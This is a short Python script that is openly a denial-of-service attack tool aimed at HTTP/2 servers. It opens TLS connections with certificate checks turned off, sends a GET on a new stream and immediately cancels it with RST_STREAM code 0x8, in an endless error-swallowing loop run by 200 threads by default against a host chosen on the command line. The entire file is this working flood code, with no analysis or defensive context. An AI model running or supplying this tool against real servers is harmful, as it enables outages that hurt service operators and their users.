#!/usr/bin/env python3
import socket, ssl, threading, time, argparse

def attack(host, port, path):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    while True:
        try:
            s = socket.create_connection((host, port), timeout=5)
            s = ctx.wrap_socket(s, server_hostname=host)
            from h2.connection import H2Connection
            from h2.config import H2Configuration
            cfg = H2Configuration(client_side=True, header_encoding="utf-8")
            conn = H2Connection(config=cfg)
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            sid = conn.get_next_available_stream_id()
            conn.send_headers(sid, [
                (":method", "GET"),
                (":path", path),
                (":scheme", "https"),
                (":authority", host),
                ("user-agent", "Mozilla/5.0"),
            ])
            s.sendall(conn.data_to_send())
            conn.reset_stream(sid, error_code=0x8)
            s.sendall(conn.data_to_send())
            s.close()
        except Exception:
            pass

def main():
    p = argparse.ArgumentParser()
    p.add_argument("-H", "--host", required=True)
    p.add_argument("-p", "--port", type=int, default=443)
    p.add_argument("--path", default="/")
    p.add_argument("-T", "--threads", type=int, default=200)
    a = p.parse_args()
    for _ in range(a.threads):
        threading.Thread(target=attack, args=(a.host, a.port, a.path), daemon=True).start()
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()